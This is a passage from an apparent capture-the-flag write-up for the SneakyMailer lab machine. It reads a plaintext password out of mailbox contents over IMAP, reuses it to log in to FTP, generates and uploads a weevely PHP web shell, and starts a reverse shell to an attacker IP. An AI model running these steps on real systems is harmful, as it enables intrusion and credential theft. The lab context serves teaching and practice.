</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span><span class=lnt>51
</span><span class=lnt>52
</span><span class=lnt>53
</span><span class=lnt>54
</span><span class=lnt>55
</span><span class=lnt>56
</span><span class=lnt>57
</span><span class=lnt>58
</span><span class=lnt>59
</span><span class=lnt>60
</span><span class=lnt>61
</span><span class=lnt>62
</span><span class=lnt>63
</span><span class=lnt>64
</span><span class=lnt>65
</span><span class=lnt>66
</span><span class=lnt>67
</span><span class=lnt>68
</span><span class=lnt>69
</span><span class=lnt>70
</span><span class=lnt>71
</span><span class=lnt>72
</span><span class=lnt>73
</span><span class=lnt>74
</span><span class=lnt>75
</span><span class=lnt>76
</span><span class=lnt>77
</span><span class=lnt>78
</span><span class=lnt>79
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>A1</span> <span class=n>LIST</span> <span class=s2>&#34;INBOX.Sent Items&#34;</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=n>A1</span> <span class=n>OK</span> <span class=n>LIST</span> <span class=n>completed</span>
</span></span><span class=line><span class=cl><span class=n>A1</span> <span class=n>SELECT</span> <span class=s2>&#34;INBOX.Sent Items&#34;</span>
</span></span><span class=line><span class=cl><span class=o>*</span> <span class=n>FLAGS</span> <span class=p>(</span>\<span class=n>Draft</span> \<span class=n>Answered</span> \<span class=n>Flagged</span> \<span class=n>Deleted</span> \<span class=n>Seen</span> \<span class=n>Recent</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=o>*</span> <span class=n>OK</span> <span class=p>[</span><span class=n>PERMANENTFLAGS</span> <span class=p>(</span>\<span class=o>*</span> \<span class=n>Draft</span> \<span class=n>Answered</span> \<span class=n>Flagged</span> \<span class=n>Deleted</span> \<span class=n>Seen</span><span class=p>)]</span> <span class=n>Limited</span>
</span></span><span class=line><span class=cl><span class=o>*</span> <span class=mi>2</span> <span class=n>EXISTS</span>
</span></span><span class=line><span class=cl><span class=o>*</span> <span class=mi>0</span> <span class=n>RECENT</span>
</span></span><span class=line><span class=cl><span class=o>*</span> <span class=n>OK</span> <span class=p>[</span><span class=n>UIDVALIDITY</span> <span class=mi>589480766</span><span class=p>]</span> <span class=n>Ok</span>
</span></span><span class=line><span class=cl><span class=o>*</span> <span class=n>OK</span> <span class=p>[</span><span class=n>MYRIGHTS</span> <span class=s2>&#34;acdilrsw&#34;</span><span class=p>]</span> <span class=n>ACL</span>
</span></span><span class=line><span class=cl><span class=n>A1</span> <span class=n>OK</span> <span class=p>[</span><span class=n>READ</span><span class=o>-</span><span class=n>WRITE</span><span class=p>]</span> <span class=n>Ok</span>
</span></span><span class=line><span class=cl><span class=n>A1</span> <span class=n>FETCH</span> <span class=mi>2</span> <span class=n>all</span>
</span></span><span class=line><span class=cl><span class=o>*</span> <span class=mi>2</span> <span class=n>FETCH</span> <span class=p>(</span><span class=n>FLAGS</span> <span class=p>(</span>\<span class=n>Seen</span><span class=p>)</span> <span class=n>INTERNALDATE</span> <span class=s2>&#34;23-Jun-2020 09:27:08 -0400&#34;</span> <span class=n>RFC822</span><span class=o>.</span><span class=n>SIZE</span> <span class=mi>585</span> <span class=n>ENVELOPE</span> <span class=p>(</span><span class=s2>&#34;Wed, 27 May 2020 13:28:58 -0400&#34;</span> <span class=s2>&#34;Module testing&#34;</span> <span class=p>((</span><span class=s2>&#34;Paul Byrd&#34;</span> <span class=n>NIL</span> <span class=s2>&#34;paulbyrd&#34;</span> <span class=s2>&#34;sneakymailer.htb&#34;</span><span class=p>))</span> <span class=p>((</span><span class=s2>&#34;Paul Byrd&#34;</span> <span class=n>NIL</span> <span class=s2>&#34;paulbyrd&#34;</span> <span class=s2>&#34;sneakymailer.htb&#34;</span><span class=p>))</span> <span class=p>((</span><span class=s2>&#34;Paul Byrd&#34;</span> <span class=n>NIL</span> <span class=s2>&#34;paulbyrd&#34;</span> <span class=s2>&#34;sneakymailer.htb&#34;</span><span class=p>))</span> <span class=p>((</span><span class=n>NIL</span> <span class=n>NIL</span> <span class=s2>&#34;low&#34;</span> <span class=s2>&#34;debian&#34;</span><span class=p>))</span> <span class=n>NIL</span> <span class=n>NIL</span> <span class=n>NIL</span> <span class=s2>&#34;&lt;4d08007d-3f7e-95ee-858a-40c6e04581bb@sneakymailer.htb&gt;&#34;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>A1</span> <span class=n>OK</span> <span class=n>FETCH</span> <span class=n>completed</span><span class=o>.</span>
</span></span><span class=line><span class=cl><span class=n>A1</span> <span class=n>FETCH</span> <span class=mi>1</span> <span class=n>all</span>
</span></span><span class=line><span class=cl><span class=o>*</span> <span class=mi>1</span> <span class=n>FETCH</span> <span class=p>(</span><span class=n>FLAGS</span> <span class=p>(</span>\<span class=n>Seen</span><span class=p>)</span> <span class=n>INTERNALDATE</span> <span class=s2>&#34;27-May-2020 13:43:07 -0400&#34;</span> <span class=n>RFC822</span><span class=o>.</span><span class=n>SIZE</span> <span class=mi>2167</span> <span class=n>ENVELOPE</span> <span class=p>(</span><span class=s2>&#34;Fri, 15 May 2020 13:03:37 -0500&#34;</span> <span class=s2>&#34;Password reset&#34;</span> <span class=p>((</span><span class=s2>&#34;Paul Byrd&#34;</span> <span class=n>NIL</span> <span class=s2>&#34;paulbyrd&#34;</span> <span class=s2>&#34;sneakymailer.htb&#34;</span><span class=p>))</span> <span class=p>((</span><span class=s2>&#34;Paul Byrd&#34;</span> <span class=n>NIL</span> <span class=s2>&#34;paulbyrd&#34;</span> <span class=s2>&#34;sneakymailer.htb&#34;</span><span class=p>))</span> <span class=p>((</span><span class=s2>&#34;Paul Byrd&#34;</span> <span class=n>NIL</span> <span class=s2>&#34;paulbyrd&#34;</span> <span class=s2>&#34;sneakymailer.htb&#34;</span><span class=p>))</span> <span class=p>((</span><span class=s2>&#34;root&#34;</span> <span class=n>NIL</span> <span class=s2>&#34;root&#34;</span> <span class=s2>&#34;debian&#34;</span><span class=p>))</span> <span class=n>NIL</span> <span class=n>NIL</span> <span class=n>NIL</span> <span class=n>NIL</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>A1</span> <span class=n>OK</span> <span class=n>FETCH</span> <span class=n>completed</span><span class=o>.</span>
</span></span><span class=line><span class=cl><span class=n>A1</span> <span class=n>FETCH</span> <span class=mi>2</span> <span class=n>body</span><span class=p>[</span><span class=n>text</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=o>*</span> <span class=mi>2</span> <span class=n>FETCH</span> <span class=p>(</span><span class=n>BODY</span><span class=p>[</span><span class=n>TEXT</span><span class=p>]</span> <span class=p>{</span><span class=mi>166</span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=n>Hello</span> <span class=n>low</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>Your</span> <span class=n>current</span> <span class=n>task</span> <span class=n>is</span> <span class=n>to</span> <span class=n>install</span><span class=p>,</span> <span class=n>test</span> <span class=ow>and</span> <span class=n>then</span> <span class=n>erase</span> <span class=n>every</span> <span class=n>python</span> <span class=n>module</span> <span class=n>you</span>
</span></span><span class=line><span class=cl><span class=n>find</span> <span class=ow>in</span> <span class=n>our</span> <span class=n>PyPI</span> <span class=n>service</span><span class=p>,</span> <span class=n>let</span> <span class=n>me</span> <span class=n>know</span> <span class=k>if</span> <span class=n>you</span> <span class=n>have</span> <span class=n>any</span> <span class=n>inconvenience</span><span class=o>.</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>A1</span> <span class=n>OK</span> <span class=n>FETCH</span> <span class=n>completed</span><span class=o>.</span>
</span></span><span class=line><span class=cl><span class=n>A1</span> <span class=n>FETCH</span> <span class=mi>1</span> <span class=n>body</span><span class=p>[</span><span class=n>text</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=o>*</span> <span class=mi>1</span> <span class=n>FETCH</span> <span class=p>(</span><span class=n>BODY</span><span class=p>[</span><span class=n>TEXT</span><span class=p>]</span> <span class=p>{</span><span class=mi>1888</span><span class=p>}</span>
</span></span><span class=line><span class=cl><span class=o>--</span><span class=n>_21F4C0AC</span><span class=o>-</span><span class=n>AA5F</span><span class=o>-</span><span class=mi>47</span><span class=n>F8</span><span class=o>-</span><span class=mi>9</span><span class=n>F7F</span><span class=o>-</span><span class=mi>7</span><span class=n>CB64B1169AD_</span>
</span></span><span class=line><span class=cl><span class=n>Content</span><span class=o>-</span><span class=n>Transfer</span><span class=o>-</span><span class=n>Encoding</span><span class=p>:</span> <span class=n>quoted</span><span class=o>-</span><span class=n>printable</span>
</span></span><span class=line><span class=cl><span class=n>Content</span><span class=o>-</span><span class=n>Type</span><span class=p>:</span> <span class=n>text</span><span class=o>/</span><span class=n>plain</span><span class=p>;</span> <span class=n>charset</span><span class=o>=</span><span class=s2>&#34;utf-8&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>Hello</span> <span class=n>administrator</span><span class=p>,</span> <span class=n>I</span> <span class=n>want</span> <span class=n>to</span> <span class=n>change</span> <span class=n>this</span> <span class=n>password</span> <span class=k>for</span> <span class=n>the</span> <span class=n>developer</span> <span class=n>accou</span><span class=o>=</span>
</span></span><span class=line><span class=cl><span class=n>nt</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>Username</span><span class=p>:</span> <span class=n>developer</span>
</span></span><span class=line><span class=cl><span class=n>Original</span><span class=o>-</span><span class=n>Password</span><span class=p>:</span> <span class=n>m</span><span class=o>^</span><span class=n>AsY7vTKVT</span><span class=o>+</span><span class=n>dV1</span><span class=p>{</span><span class=n>WOU</span><span class=o>%</span><span class=err>@</span><span class=n>NaHkUAId3</span><span class=p>]</span><span class=n>C</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>Please</span> <span class=n>notify</span> <span class=n>me</span> <span class=n>when</span> <span class=n>you</span> <span class=k>do</span> <span class=n>it</span><span class=o>=</span><span class=mi>20</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>--</span><span class=n>_21F4C0AC</span><span class=o>-</span><span class=n>AA5F</span><span class=o>-</span><span class=mi>47</span><span class=n>F8</span><span class=o>-</span><span class=mi>9</span><span class=n>F7F</span><span class=o>-</span><span class=mi>7</span><span class=n>CB64B1169AD_</span>
</span></span><span class=line><span class=cl><span class=n>Content</span><span class=o>-</span><span class=n>Transfer</span><span class=o>-</span><span class=n>Encoding</span><span class=p>:</span> <span class=n>quoted</span><span class=o>-</span><span class=n>printable</span>
</span></span><span class=line><span class=cl><span class=n>Content</span><span class=o>-</span><span class=n>Type</span><span class=p>:</span> <span class=n>text</span><span class=o>/</span><span class=n>html</span><span class=p>;</span> <span class=n>charset</span><span class=o>=</span><span class=s2>&#34;utf-8&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>&lt;</span><span class=n>html</span> <span class=n>xmlns</span><span class=p>:</span><span class=n>o</span><span class=o>=</span><span class=mi>3</span><span class=n>D</span><span class=s2>&#34;urn:schemas-microsoft-com:office:office&#34;</span> <span class=n>xmlns</span><span class=p>:</span><span class=n>w</span><span class=o>=</span><span class=mi>3</span><span class=n>D</span><span class=s2>&#34;urn:sc=</span>
</span></span><span class=line><span class=cl><span class=n>hemas</span><span class=o>-</span><span class=n>microsoft</span><span class=o>-</span><span class=n>com</span><span class=p>:</span><span class=n>office</span><span class=p>:</span><span class=n>word</span><span class=s2>&#34; xmlns:m=3D&#34;</span><span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=n>schemas</span><span class=o>.</span><span class=n>microsoft</span><span class=o>.</span><span class=n>com</span><span class=o>/</span><span class=n>of</span><span class=o>=</span>
</span></span><span class=line><span class=cl><span class=n>fice</span><span class=o>/</span><span class=mi>2004</span><span class=o>/</span><span class=mi>12</span><span class=o>/</span><span class=n>omml</span><span class=s2>&#34; xmlns=3D&#34;</span><span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=n>www</span><span class=o>.</span><span class=n>w3</span><span class=o>.</span><span class=n>org</span><span class=o>/</span><span class=n>TR</span><span class=o>/</span><span class=n>REC</span><span class=o>-</span><span class=n>html40</span><span class=s2>&#34;&gt;&lt;head&gt;&lt;meta ht=</span>
</span></span><span class=line><span class=cl><span class=n>tp</span><span class=o>-</span><span class=n>equiv</span><span class=o>=</span><span class=mi>3</span><span class=n>DContent</span><span class=o>-</span><span class=n>Type</span> <span class=n>content</span><span class=o>=</span><span class=mi>3</span><span class=n>D</span><span class=s2>&#34;text/html; charset=3Dutf-8&#34;</span><span class=o>&gt;&lt;</span><span class=n>meta</span> <span class=n>name</span><span class=o>=</span>
</span></span><span class=line><span class=cl><span class=o>=</span><span class=mi>3</span><span class=n>DGenerator</span> <span class=n>content</span><span class=o>=</span><span class=mi>3</span><span class=n>D</span><span class=s2>&#34;Microsoft Word 15 (filtered medium)&#34;</span><span class=o>&gt;&lt;</span><span class=n>style</span><span class=o>&gt;&lt;!--</span>
</span></span><span class=line><span class=cl><span class=o>/*</span> <span class=ne>Font</span> <span class=n>Definitions</span> <span class=o>*/</span>
</span></span><span class=line><span class=cl><span class=err>@</span><span class=n>font</span><span class=o>-</span><span class=n>face</span>
</span></span><span class=line><span class=cl>        <span class=p>{</span><span class=n>font</span><span class=o>-</span><span class=n>family</span><span class=p>:</span><span class=s2>&#34;Cambria Math&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>panose</span><span class=o>-</span><span class=mi>1</span><span class=p>:</span><span class=mi>2</span> <span class=mi>4</span> <span class=mi>5</span> <span class=mi>3</span> <span class=mi>5</span> <span class=mi>4</span> <span class=mi>6</span> <span class=mi>3</span> <span class=mi>2</span> <span class=mi>4</span><span class=p>;}</span>
</span></span><span class=line><span class=cl><span class=err>@</span><span class=n>font</span><span class=o>-</span><span class=n>face</span>
</span></span><span class=line><span class=cl>        <span class=p>{</span><span class=n>font</span><span class=o>-</span><span class=n>family</span><span class=p>:</span><span class=n>Calibri</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>panose</span><span class=o>-</span><span class=mi>1</span><span class=p>:</span><span class=mi>2</span> <span class=mi>15</span> <span class=mi>5</span> <span class=mi>2</span> <span class=mi>2</span> <span class=mi>2</span> <span class=mi>4</span> <span class=mi>3</span> <span class=mi>2</span> <span class=mi>4</span><span class=p>;}</span>
</span></span><span class=line><span class=cl><span class=o>/*</span> <span class=n>Style</span> <span class=n>Definitions</span> <span class=o>*/</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=o>.</span><span class=n>MsoNormal</span><span class=p>,</span> <span class=n>li</span><span class=o>.</span><span class=n>MsoNormal</span><span class=p>,</span> <span class=n>div</span><span class=o>.</span><span class=n>MsoNormal</span>
</span></span><span class=line><span class=cl>        <span class=p>{</span><span class=n>margin</span><span class=p>:</span><span class=mi>0</span><span class=ow>in</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>margin</span><span class=o>-</span><span class=n>bottom</span><span class=p>:</span><span class=o>.</span><span class=mi>0001</span><span class=n>pt</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>font</span><span class=o>-</span><span class=n>size</span><span class=p>:</span><span class=mf>11.0</span><span class=n>pt</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>font</span><span class=o>-</span><span class=n>family</span><span class=p>:</span><span class=s2>&#34;Calibri&#34;</span><span class=p>,</span><span class=n>sans</span><span class=o>-</span><span class=n>serif</span><span class=p>;}</span>
</span></span><span class=line><span class=cl><span class=o>.</span><span class=n>MsoChpDefault</span>
</span></span><span class=line><span class=cl>        <span class=p>{</span><span class=n>mso</span><span class=o>-</span><span class=n>style</span><span class=o>-</span><span class=n>type</span><span class=p>:</span><span class=k>export</span><span class=o>-</span><span class=n>only</span><span class=p>;}</span>
</span></span><span class=line><span class=cl><span class=err>@</span><span class=n>page</span> <span class=n>WordSection1</span>
</span></span><span class=line><span class=cl>        <span class=p>{</span><span class=n>size</span><span class=p>:</span><span class=mf>8.5</span><span class=ow>in</span> <span class=mf>11.0</span><span class=ow>in</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=n>margin</span><span class=p>:</span><span class=mf>1.0</span><span class=ow>in</span> <span class=mf>1.0</span><span class=ow>in</span> <span class=mf>1.0</span><span class=ow>in</span> <span class=mf>1.0</span><span class=ow>in</span><span class=p>;}</span>
</span></span><span class=line><span class=cl><span class=n>div</span><span class=o>.</span><span class=n>WordSection1</span>
</span></span><span class=line><span class=cl>        <span class=p>{</span><span class=n>page</span><span class=p>:</span><span class=n>WordSection1</span><span class=p>;}</span>
</span></span><span class=line><span class=cl><span class=o>--&gt;&lt;/</span><span class=n>style</span><span class=o>&gt;&lt;/</span><span class=n>head</span><span class=o>&gt;&lt;</span><span class=n>body</span> <span class=n>lang</span><span class=o>=</span><span class=mi>3</span><span class=n>DEN</span><span class=o>-</span><span class=n>US</span> <span class=n>link</span><span class=o>=</span><span class=mi>3</span><span class=n>Dblue</span> <span class=n>vlink</span><span class=o>=</span><span class=mi>3</span><span class=n>D</span><span class=s2>&#34;#954F72&#34;</span><span class=o>&gt;&lt;</span><span class=n>div</span> <span class=n>cla</span><span class=o>=</span>
</span></span><span class=line><span class=cl><span class=n>ss</span><span class=o>=</span><span class=mi>3</span><span class=n>DWordSection1</span><span class=o>&gt;&lt;</span><span class=n>p</span> <span class=k>class</span><span class=o>=</span><span class=mi>3</span><span class=n>DMsoNormal</span><span class=o>&gt;</span><span class=n>Hello</span> <span class=n>administrator</span><span class=p>,</span> <span class=n>I</span> <span class=n>want</span> <span class=n>to</span> <span class=n>chang</span><span class=o>=</span>
</span></span><span class=line><span class=cl><span class=n>e</span> <span class=n>this</span> <span class=n>password</span> <span class=k>for</span> <span class=n>the</span> <span class=n>developer</span> <span class=n>account</span><span class=o>&lt;/</span><span class=n>p</span><span class=o>&gt;&lt;</span><span class=n>p</span> <span class=k>class</span><span class=o>=</span><span class=mi>3</span><span class=n>DMsoNormal</span><span class=o>&gt;&lt;</span><span class=n>o</span><span class=p>:</span><span class=n>p</span><span class=o>&gt;&amp;</span><span class=n>nbs</span><span class=o>=</span>
</span></span><span class=line><span class=cl><span class=n>p</span><span class=p>;</span><span class=o>&lt;/</span><span class=n>o</span><span class=p>:</span><span class=n>p</span><span class=o>&gt;&lt;/</span><span class=n>p</span><span class=o>&gt;&lt;</span><span class=n>p</span> <span class=k>class</span><span class=o>=</span><span class=mi>3</span><span class=n>DMsoNormal</span><span class=o>&gt;</span><span class=n>Username</span><span class=p>:</span> <span class=n>developer</span><span class=o>&lt;/</span><span class=n>p</span><span class=o>&gt;&lt;</span><span class=n>p</span> <span class=k>class</span><span class=o>=</span><span class=mi>3</span><span class=n>DMsoNorma</span><span class=o>=</span>
</span></span><span class=line><span class=cl><span class=n>l</span><span class=o>&gt;</span><span class=n>Original</span><span class=o>-</span><span class=n>Password</span><span class=p>:</span> <span class=n>m</span><span class=o>^</span><span class=n>AsY7vTKVT</span><span class=o>+</span><span class=n>dV1</span><span class=p>{</span><span class=n>WOU</span><span class=o>%</span><span class=err>@</span><span class=n>NaHkUAId3</span><span class=p>]</span><span class=n>C</span><span class=o>&lt;/</span><span class=n>p</span><span class=o>&gt;&lt;</span><span class=n>p</span> <span class=k>class</span><span class=o>=</span><span class=mi>3</span><span class=n>DMsoNorm</span><span class=o>=</span>
</span></span><span class=line><span class=cl><span class=n>al</span><span class=o>&gt;&lt;</span><span class=n>o</span><span class=p>:</span><span class=n>p</span><span class=o>&gt;&amp;</span><span class=n>nbsp</span><span class=p>;</span><span class=o>&lt;/</span><span class=n>o</span><span class=p>:</span><span class=n>p</span><span class=o>&gt;&lt;/</span><span class=n>p</span><span class=o>&gt;&lt;</span><span class=n>p</span> <span class=k>class</span><span class=o>=</span><span class=mi>3</span><span class=n>DMsoNormal</span><span class=o>&gt;</span><span class=n>Please</span> <span class=n>notify</span> <span class=n>me</span> <span class=n>when</span> <span class=n>you</span> <span class=k>do</span> <span class=n>i</span><span class=o>=</span>
</span></span><span class=line><span class=cl><span class=n>t</span> <span class=o>&lt;/</span><span class=n>p</span><span class=o>&gt;&lt;/</span><span class=n>div</span><span class=o>&gt;&lt;/</span><span class=n>body</span><span class=o>&gt;&lt;/</span><span class=n>html</span><span class=o>&gt;=</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>--</span><span class=n>_21F4C0AC</span><span class=o>-</span><span class=n>AA5F</span><span class=o>-</span><span class=mi>47</span><span class=n>F8</span><span class=o>-</span><span class=mi>9</span><span class=n>F7F</span><span class=o>-</span><span class=mi>7</span><span class=n>CB64B1169AD_</span><span class=o>--</span>
</span></span><span class=line><span class=cl><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>A1</span> <span class=n>OK</span> <span class=n>FETCH</span> <span class=n>completed</span><span class=o>.</span>
</span></span></code></pre></td></tr></table></div></div><p>Let&rsquo;s try those creds: <code>developer</code> / <code>m^AsY7vTKVT+dV1{WOU%@NaHkUAId3]C</code> and then mess with pypi modules.</p><h2 id=ftp-access>FTP access<a hidden class=anchor aria-hidden=true href=#ftp-access>#</a></h2><p>The credentials are working on the FTP server:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ ftp sneakycorp.htb
</span></span><span class=line><span class=cl>Connected to sneakycorp.htb.
</span></span><span class=line><span class=cl>220 (vsFTPd 3.0.3)
</span></span><span class=line><span class=cl>Name (sneakycorp.htb:cyfun): developer
</span></span><span class=line><span class=cl>331 Please specify the password.
</span></span><span class=line><span class=cl>Password:
</span></span><span class=line><span class=cl>230 Login successful.
</span></span><span class=line><span class=cl>Remote system type is UNIX.
</span></span><span class=line><span class=cl>Using binary mode to transfer files.
</span></span><span class=line><span class=cl>ftp&gt; ls
</span></span><span class=line><span class=cl>200 PORT command successful. Consider using PASV.
</span></span><span class=line><span class=cl>150 Here comes the directory listing.
</span></span><span class=line><span class=cl>drwxrwxr-x    8 0        1001         4096 Nov 08 15:39 dev
</span></span><span class=line><span class=cl>226 Directory send OK.
</span></span><span class=line><span class=cl>ftp&gt; ls dev
</span></span><span class=line><span class=cl>200 PORT command successful. Consider using PASV.
</span></span><span class=line><span class=cl>150 Here comes the directory listing.
</span></span><span class=line><span class=cl>drwxr-xr-x    2 0        0            4096 May 26 18:52 css
</span></span><span class=line><span class=cl>drwxr-xr-x    2 0        0            4096 May 26 18:52 img
</span></span><span class=line><span class=cl>-rwxr-xr-x    1 0        0           13742 Jun 23 08:44 index.php
</span></span><span class=line><span class=cl>drwxr-xr-x    3 0        0            4096 May 26 18:52 js
</span></span><span class=line><span class=cl>drwxr-xr-x    2 0        0            4096 May 26 18:52 pypi
</span></span><span class=line><span class=cl>drwxr-xr-x    4 0        0            4096 May 26 18:52 scss
</span></span><span class=line><span class=cl>-rwxr-xr-x    1 0        0           26523 May 26 19:58 team.php
</span></span><span class=line><span class=cl>drwxr-xr-x    8 0        0            4096 May 26 18:52 vendor
</span></span><span class=line><span class=cl>226 Directory send OK.
</span></span></code></pre></td></tr></table></div></div><p>Before uploadign a PHP web shell, let&rsquo;s craft one:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>$ weevely generate cyfun agent.php
</span></span><span class=line><span class=cl>Generated &#39;agent.php&#39; with password &#39;cyfun&#39; of 744 byte size.
</span></span></code></pre></td></tr></table></div></div><p>Then let&rsquo;s uplaod it:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>ftp&gt; cd dev
</span></span><span class=line><span class=cl>250 Directory successfully changed.
</span></span><span class=line><span class=cl>ftp&gt; put agent.php
</span></span><span class=line><span class=cl>200 PORT command successful. Consider using PASV.
</span></span><span class=line><span class=cl>150 Ok to send data.
</span></span><span class=line><span class=cl>226 Transfer complete.
</span></span><span class=line><span class=cl>744 bytes sent in 6.3e-05 seconds (11.3 Mbytes/s)
</span></span></code></pre></td></tr></table></div></div><p>Then let&rsquo;s connect to our webshell and use the <code>backdoor_reversetcp</code> module
to get a reverse shell because the webshell is quickly removed from the server:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=o>$</span> <span class=n>weevely</span> <span class=n>http</span><span class=p>:</span><span class=o>//</span><span class=n>dev</span><span class=o>.</span><span class=n>sneakycorp</span><span class=o>.</span><span class=n>htb</span><span class=o>/</span><span class=n>agent</span><span class=o>.</span><span class=n>php</span> <span class=n>cyfun</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>weevely</span> <span class=mf>4.0</span><span class=o>.</span><span class=mi>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Target</span><span class=p>:</span>     <span class=n>www</span><span class=o>-</span><span class=n>data</span><span class=err>@</span><span class=n>sneakymailer</span><span class=p>:</span><span class=o>/</span><span class=k>var</span><span class=o>/</span><span class=n>www</span><span class=o>/</span><span class=n>dev</span><span class=o>.</span><span class=n>sneakycorp</span><span class=o>.</span><span class=n>htb</span><span class=o>/</span><span class=n>dev</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Session</span><span class=p>:</span>    <span class=o>/</span><span class=n>home</span><span class=o>/</span><span class=n>cyfun</span><span class=o>/.</span><span class=n>weevely</span><span class=o>/</span><span class=n>sessions</span><span class=o>/</span><span class=n>dev</span><span class=o>.</span><span class=n>sneakycorp</span><span class=o>.</span><span class=n>htb</span><span class=o>/</span><span class=n>agent_0</span><span class=o>.</span><span class=n>session</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Shell</span><span class=p>:</span>      <span class=n>System</span> <span class=n>shell</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Browse</span> <span class=n>the</span> <span class=n>filesystem</span> <span class=ow>or</span> <span class=n>execute</span> <span class=n>commands</span> <span class=n>starts</span> <span class=n>the</span> <span class=n>connection</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>to</span> <span class=n>the</span> <span class=n>target</span><span class=o>.</span> <span class=n>Type</span> <span class=p>:</span><span class=n>help</span> <span class=k>for</span> <span class=n>more</span> <span class=n>information</span><span class=o>.</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>weevely</span><span class=o>&gt;</span> <span class=p>:</span><span class=n>backdoor_reversetcp</span> <span class=mf>10.10</span><span class=o>.</span><span class=mf>14.174</span> <span class=mi>8080</span>
